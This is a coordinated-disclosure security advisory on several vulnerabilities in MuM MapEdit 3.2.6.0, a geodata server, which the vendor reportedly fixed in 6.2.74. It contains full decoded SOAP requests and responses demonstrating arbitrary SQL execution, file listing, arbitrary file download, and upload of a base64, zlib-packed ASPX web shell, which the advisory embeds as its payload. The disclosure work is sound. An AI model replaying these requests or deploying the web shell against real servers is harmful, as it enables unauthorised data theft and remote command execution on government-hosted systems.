@@ -1,0 +1,389 @@
+# Security Advisory -- Multiple Vulnerabilities - MuM Map Edit
+
+
+## Product
+
+Vendor: Mensch und Maschine Software SE / Mensch und Maschine acadGraph GmbH
+Product: MapEdit
+Affected software version: 3.2.6.0
+
+MuM MapEdit provides geodata to the internet and intranets and is deployed on several communal and
+regional governmental infrastructures to provide geodata to the population. It consists of a
+silverlight client and a C#.NET backend. The communication between them is HTTP/S based and involves
+the NBFS (.NET Binary Format SOAP).
+
+Link: http://www.mum.de/DE_Autodesk-Topobase-GIS-Datenerfassung-MuM-MapEdit.CAD
+
+
+## Status/Metrics/Identifier
+
+CVE-ID: tbd
+CVSS v2 Vector: (AV:N/AC:L/Au:S/C:C/I:C/A:C)
+CVSS Score: 9.0
+
+The CVSS Score reflects the possibility of an attacker to upload web shells and execute them with
+the privileges of the web server user.
+
+## Author/Credits
+
+Paul Baade (TÜV Rheinland i-sec GmbH)
+Sven Krewitt (TÜV Rheinland i-sec GmbH)
+
+
+## Fixed Versions
+
+According to MuM all described vulnerabilities are fixed in version 6.2.74, some of them are reportedly
+already fixed in version 5.1.
+
+
+## Authentication via GET Parameter
+The application requires users to provide their credentials via GET Parameters. They can therefore
+possibly be found in server logs or proxy logs. An example URL would be:
+
+    /Mum.Geo.Services/Start.aspx?AutoUrl=1&Username=TEST&Password=TEST[...]
+
+
+## Execution of arbitrary SQL commands on contained SQLite DBs
+The application contains several SQLite databases. An authenticated user may send POST requests to
+the URL /Mum.Geo.Services/DataAccessService.svc. This service is used to execute SQL queries
+on the databases.
+The content of the POST request is encoded in Microsofts NBFS (.NET Binary Format SOAP) and can be
+decoded to the following XML data:
+
+Request:
+--------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:DataAccessService/QueryData</a:Action>
+                        <a:MessageID>urn:uuid:b086a157-1bce-41be-b25c-492ab4f6dfa3</a:MessageID>
+                        <a:SequenceAcknowledgement>
+                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>
+                        </a:SequenceAcknowledgement>
+                        <a:To s:mustUnderstand="1">http://[host]/Mum.Geo.Services/DataAccessService.svc</a:To>
+            </s:Header>
+            <s:Body>
+                        <QueryData>
+                                   <connection i:type="c:SQLiteConnection" xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess" xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns:c="http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess.SQLite">
+                                               <b:CurrentRepresentation>
+                                                           <b:CollectionFeatureClassName/>
+                                                           <b:Id>0</b:Id>
+                                                           <b:LineFeatureClassName/>
+                                                           <b:Name/>
+                                                           <b:PointFeatureClassName/>
+                                                           <b:PolygonFeatureClassName/>
+                                               </b:CurrentRepresentation>
+                                               <b:DbVersion>999</b:DbVersion>
+                                               <b:Id>0</b:Id>
+                                               <b:Name>SYSTEM</b:Name>
+                                               <b:StorageSchemaType>Unknown</b:StorageSchemaType>
+                                               <c:Filename>[path_to_MumGeoData]\System\System.db</c:Filename>
+                                   </connection>
+                                   <sql>select name, caption, version_systemdata from project where id in (select Project_id from usergroup_project where usergroup_id  in (select usergroup_id from user_usergroup where user_id in (select id from user where name='TEST'))) order by caption</sql>
+                                   <queryDefinition xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+                                               <b:Columns/>
+                                               <b:SRID>0</b:SRID>
+                                   </queryDefinition>
+                                   <parameterNames xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"/>
+                                   <parameterValues xmlns:b="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns:i="http://www.w3.org/2001/XMLSchema-instance"/>
+                                   <startRow>1</startRow>
+                                   <bufferSize>2000</bufferSize>
+                                   <limit>0</limit>
+                        </QueryData>
+            </s:Body>
+</s:Envelope>
+
+The node "Filename" can be used to access different SQLite databases on the system, while the node
+"sql" contains the SQL-query to be executed on the system.
+Responses to this request are encoded in NBFS as well and can be decoded to the following XML data:
+
+Response:
+---------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:DataAccessService/QueryDataResponse</a:Action>
+                        <a:RelatesTo>urn:uuid:b086a157-1bce-41be-b25c-492ab4f6dfa3</a:RelatesTo>
+            </s:Header>
+            <s:Body>
+                        <QueryDataResponse>
+                                   <QueryDataResult xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.Core" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+                                               <b:Parameter xmlns:c="http://schemas.datacontract.org/2004/07/Mum.Geo.DataAccess">
+                                                           <c:Data>eNpjZAACZncXTwihYm6SlpiUammsa2hpaKlrkmhsrpuYamSpa2RkbGxpkZpsYZCSDAD4Jgsj</c:Data>
+                                                           <c:FetchedAllRows>true</c:FetchedAllRows>
+                                                           <c:ResultColumns>
+                                                                       <c:DbColumnDefinition>
+                                                                                  <c:Caption>NAME</c:Caption>
+                                                                                  <c:DataType>DbString</c:DataType>
+                                                                                  <c:DefaultValue/>
+                                                                                  <c:IsNullable>false</c:IsNullable>
+                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>
+                                                                                  <c:Length>255</c:Length>
+                                                                                  <c:Name>NAME</c:Name>
+                                                                                  <c:Precision>0</c:Precision>
+                                                                                  <c:Scale>0</c:Scale>
+                                                                       </c:DbColumnDefinition>
+                                                                       <c:DbColumnDefinition>
+                                                                                  <c:Caption>CAPTION</c:Caption>
+                                                                                  <c:DataType>DbString</c:DataType>
+                                                                                  <c:DefaultValue/>
+                                                                                  <c:IsNullable>false</c:IsNullable>
+                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>
+                                                                                  <c:Length>255</c:Length>
+                                                                                  <c:Name>CAPTION</c:Name>
+                                                                                  <c:Precision>0</c:Precision>
+                                                                                  <c:Scale>0</c:Scale>
+                                                                       </c:DbColumnDefinition>
+                                                                       <c:DbColumnDefinition>
+                                                                                  <c:Caption>VERSION_SYSTEMDATA</c:Caption>
+                                                                                  <c:DataType>DbString</c:DataType>
+                                                                                  <c:DefaultValue/>
+                                                                                  <c:IsNullable>true</c:IsNullable>
+                                                                                  <c:IsPrimaryKey>false</c:IsPrimaryKey>
+                                                                                  <c:Length>40</c:Length>
+                                                                                  <c:Name>VERSION_SYSTEMDATA</c:Name>
+                                                                                  <c:Precision>0</c:Precision>
+                                                                                  <c:Scale>0</c:Scale>
+                                                                       </c:DbColumnDefinition>
+                                                           </c:ResultColumns>
+                                               </b:Parameter>
+                                               <b:State>
+                                                           <b:Tags>
+                                                                       <b:Item i:nil="true"/>
+                                                           </b:Tags>
+                                                           <b:ExceptionMessage/>
+                                                           <b:StackTrace/>
+                                                           <b:Succeeded>true</b:Succeeded>
+                                               </b:State>
+                                   </QueryDataResult>
+                        </QueryDataResponse>
+            </s:Body>
+</s:Envelope>
+
+The nodes "DbColumnDefinition" contain the definition of the returned columns, the node "Data"
+contains the result of the SQL-query as an Base64-encoded zlib-compressed data:
+
+            GDI|GDI|74fabe93-1919-4a37-ae29-223398ec80dc
+
+The same result can be produced, when the database is locally read:
+
+            >sqlite3 System.db
+
+            sqlite> select name, caption, version_systemdata from project where id
+                        in (select Project_id      from usergroup_project where usergroup_id
+                                   in (select usergroup_id from user_usergroup where user_id
+                                               in (select id from user where name='TEST'))) order by caption;
+
+            GDI|GDI|74fabe93-1919-4a37-ae29-223398ec80dc
+
+
+## Arbitrary file manipulation
+By sending POST requests to the URL /Mum.Geo.Services/IO.svc an authenticated user is able to
+perform several actions.
+Most interesting, from an attacker's point of view, would be the following:
+            - "GetFileName", which lists files in a given folder
+            - "DownloadFile", which enables the user to download any file the web server has read-access to
+            - "UploadFile", which allows to upload files to folders the web server has write-access to
+
+The different activities are documented in the subsections below.
+As well as in the SQL execution section, the request and response content is decoded from NBFS for
+better readability.
+
+### File exploration
+An authenticated user is able to list all files in a given folder by sending the following content
+to the IO Service.
+
+Request:
+--------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/GetFileNames</a:Action>
+                        <a:MessageID>urn:uuid:037dee48-520a-46ae-a47b-b9b57a901676</a:MessageID>
+                        <a:SequenceAcknowledgement>
+                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>
+                        </a:SequenceAcknowledgement>
+                        <a:To s:mustUnderstand="1">http://[host]/Mum.Geo.Services/IO.svc</a:To>
+            </s:Header>
+            <s:Body>
+                        <GetFileNames>
+                                   <path>[path_to_webroot]</path>
+                                   <searchPattern>*.*</searchPattern>
+                                   <recursive>false</recursive>
+                        </GetFileNames>
+            </s:Body>
+</s:Envelope>
+
+Response:
+---------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/GetFileNamesResponse</a:Action>
+                        <a:RelatesTo>urn:uuid:037dee48-520a-46ae-a47b-b9b57a901676</a:RelatesTo>
+            </s:Header>
+            <s:Body>
+                        <GetFileNamesResponse>
+                                   <GetFileNamesResult xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.Core" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+                                               <b:Parameter xmlns:c="http://schemas.datacontract.org/2004/07/Mum.Geo.IO">
+                                                           <c:FileNames xmlns:d="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
+                                                                       <d:string>clientaccesspolicy.xml</d:string>
+                                                                       <d:string>crossdomain.xml</d:string>
+                                                                       <d:string>iisstart.htm</d:string>
+                                                                       <d:string>index.html</d:string>
+                                                                       <d:string>index.php</d:string>
+                                                                       <d:string>Thumbs.db</d:string>
+                                                                       <d:string>web.config</d:string>
+                                                                       <d:string>welcome.png</d:string>
+                                                           </c:FileNames>
+                                                           <c:Path>[path_to_webroot]</c:Path>
+                                               </b:Parameter>
+                                               <b:State>
+                                                           <b:Tags>
+                                                                       <b:Item i:nil="true"/>
+                                                           </b:Tags>
+                                                           <b:ExceptionMessage/>
+                                                           <b:StackTrace/>
+                                                           <b:Succeeded>true</b:Succeeded>
+                                               </b:State>
+                                   </GetFileNamesResult>
+                        </GetFileNamesResponse>
+            </s:Body>
+</s:Envelope>
+
+### Download of arbitrary files
+The same web service can be abused to download any file, that the web server user has read-access to.
+
+Request:
+--------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/DownloadFile</a:Action>
+                        <a:MessageID>urn:uuid:48428e6d-19b5-42e2-ad6c-6bfde4849504</a:MessageID>
+                        <a:SequenceAcknowledgement>
+                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>
+                        </a:SequenceAcknowledgement>
+                        <a:To s:mustUnderstand="1">http://[host]/Mum.Geo.Services/IO.svc</a:To>
+            </s:Header>
+            <s:Body>
+                        <DownloadFile>
+                                   <filename>[path_to_webroot]\Mum.Geo.Services\Admin.html</filename>
+                        </DownloadFile>
+            </s:Body>
+</s:Envelope>
+
+Response:
+---------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/DownloadFileResponse</a:Action>
+                        <a:RelatesTo>urn:uuid:48428e6d-19b5-42e2-ad6c-6bfde4849504</a:RelatesTo>
+            </s:Header>
+            <s:Body>
+                        <DownloadFileResponse>
+                                   <DownloadFileResult xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.Server.Core.IO" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+                                               <b:Data>77u/PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgVHJhbnNpdGlvbmFsLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXRyYW5zaXRpb25hbC5kdGQiPg0KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPg0KPGhlYWQ+DQogICAgPHRpdGxlPkFkbWluPC90aXRsZT4NCiAgICA8bWV0YSBodHRwLWVxdWl2PSJyZWZyZXNoIiBjb250ZW50PSIwOyBVUkw9U3RhcnQuYXNweD9BZG1pbk1vZGU9dHJ1ZSIvPg0KPC9oZWFkPg0KPGJvZHk+DQogIDxwPjxhIGhyZWY9IlN0YXJ0LmFzcHg/QWRtaW5Nb2RlPXRydWUiPlN0YXJ0IE11bSBBZG1pbmlzdHJhdG9yPC9hPjwvcD4gDQo8L2JvZHk+DQo8L2h0bWw+DQo=</b:Data>
+                                               <b:FileNotFound>false</b:FileNotFound>
+                                               <b:IsComplete>true</b:IsComplete>
+                                   </DownloadFileResult>
+                        </DownloadFileResponse>
+            </s:Body>
+</s:Envelope>
+
+The node "Data" itself can be base64-decoded, to receive the file contents:
+
+            ï»¿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+            "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+            <html xmlns="http://www.w3.org/1999/xhtml">
+            <head>
+                        <title>Admin</title>
+                        <meta http-equiv="refresh" content="0; URL=Start.aspx?AdminMode=true"/>
+            </head>
+            <body>
+              <p><a href="Start.aspx?AdminMode=true">Start Mum Administrator</a></p>
+            </body>
+            </html>
+
+
+### Upload of arbitrary files
+The web service can be abused to upload a file to any folder, that the web server user has
+write-access to.
+
+Request:
+--------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/UploadFile</a:Action>
+                        <a:MessageID>urn:uuid:20cca52e-da4c-4981-a433-eb596411d89a</a:MessageID>
+                        <a:SequenceAcknowledgement>
+                                   <a:ReplyTo>http://www.w3.org/2005/08/addressing/anonymous</a:ReplyTo>
+                        </a:SequenceAcknowledgement>
+                        <a:To s:mustUnderstand="1">http://[host]/Mum.Geo.Services/IO.svc</a:To>
+            </s:Header>
+            <s:Body>
+                        <UploadFile>
+                                   <clientFilename/>
+                                   <serverFilename>[path_to_webroot]\MumGeoData\Userdata\GDI\isec.aspx</serverFilename>
+                                   <temporaryServerFilename>[path_to_MumGeoData]\Userdata\GDI\e41279bd-343d-48a1-a413-05e1b3c50f40\Bookmarks\Bookmarks.sod.tmp636008925231332626</temporaryServerFilename>
+                                    <data>eJyFk21P2zAQx9/nU5w8IbXalj4A29Qk1aANolJHK5qJaW+QkxwhW2JHtgNBE99956TdWEHsleN7/Pl/F//gM6x5hrDkIqvpI2CzNwzmGNdZwIyqkUGkeEL2G15ouh1MHZ+SFmUllYELXqKuWv/mQRss3XnOMyG1yRP9/+DFqovRicor8wQiIQhVC24CplHdoWJT507maQt7vZQ87cn4ByYGNIoU1TsI71CYE5VpwL7zy3l0tFG5yCBsktrgrEx7WwNXmQ1YK5mg1hvDlVmIGwmVziEAgfew7+r1PYe87lleoH0DhbGkTF1skHUe6luX1F9b1yAB9pa6dK5LTHNFoFRNpFylq9pUtaE4K24X8lXj5haLImzQspKv1drbMUJFpu2321L1KI2gNkYhLy+RkwKgTalSRZGV+28vbyeFpeuiXJsTyVCk9m1b26yQGu1doamVAO2Riq3o9Fhiu54VefJzX/ftJPfkv6RBS6HRvVK5wR7zK4VTRrX3HJt2uO65KYtQJDLF3t95mcYWdCNsTL//PJX5g13RR8cfdCtEu3QefVnaIzyZ02FyU+CU36MAritXoIF7jLWV2x90TkreBscyfQA6b6QqIU8DO2UGJZpbSZeKtvr5VvpUdmIZT2XT5nTYjJR+KGiTv79fXMzDbxMYDUceLMOzaAJHw+Oq8WC92iyixepiAjzWsqBnexCt1hMYD6tmvxNc5am5Ddj42Dqn/uBJ3y3FaW2MFB0E0h8oXqQY7yg+fHydYvTpBQrbMWDYDonBSrQ70Qr1Z0N2cB3Olm3JYyxatCIubJGX0A53aIej4esCjZ+jTWeyLGnvJ133tqGdrR2mPe1w21m3+/EbI5Kikw==</data>
+                                   <append>false</append>
+                                   <completed>true</completed>
+                        </UploadFile>
+            </s:Body>
+</s:Envelope>
+
+The "data" node contains a base64-encoded, zlib-packed aspx web shell. It can be used to issue
+arbitrary commands on the compromised host.
+
+Response:
+---------
+<?xml version="1.0" encoding="utf-8"?>
+<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing">
+            <s:Header>
+                        <a:Action s:mustUnderstand="1">urn:IO/UploadFileResponse</a:Action>
+                        <a:RelatesTo>urn:uuid:20cca52e-da4c-4981-a433-eb596411d89a</a:RelatesTo>
+            </s:Header>
+            <s:Body>
+                        <UploadFileResponse>
+                                   <UploadFileResult xmlns:b="http://schemas.datacontract.org/2004/07/Mum.Geo.Core" xmlns:i="http://www.w3.org/2001/XMLSchema-instance">
+                                               <b:Parameter/>
+                                               <b:State>
+                                                           <b:Tags>
+                                                                       <b:Item i:nil="true"/>
+                                                           </b:Tags>
+                                                           <b:ExceptionMessage/>
+                                                           <b:StackTrace/>
+                                                           <b:Succeeded>true</b:Succeeded>
+                                               </b:State>
+                                   </UploadFileResult>
+                        </UploadFileResponse>
+            </s:Body>
+</s:Envelope>
+
+
+## Base64 encoded Passwords
+In the database file in \MumGeoData\System\System.db Passwords are stored in the tables "user" and
+"connection". Both tables store their passwords in plain text with base64 encoding applied.
+
+Example:
+sqlite> select * from user where name='MUM';
+<User GUID>|MUM|<base64 encoded password>|1||
+
+
+## Remark about information disclosures
+Observing the communication between a MapEdit Silverlight client and its backend server, various
+information could be gathered, particularly file paths and license keys. Additionally the error
+messages, that the server generates discloses quite a lot of information about the backend parsing
+process.
+
+
+## History
+
+2016-06-07        Discovery of mentioned vulnerabilities
+2016-06-09        First contact with MuM
+2016-06-23        confirmation of mentioned vulnerabilities
+2016-07-29        Release of version 6.2.74
+2016-09-13        Public disclosure
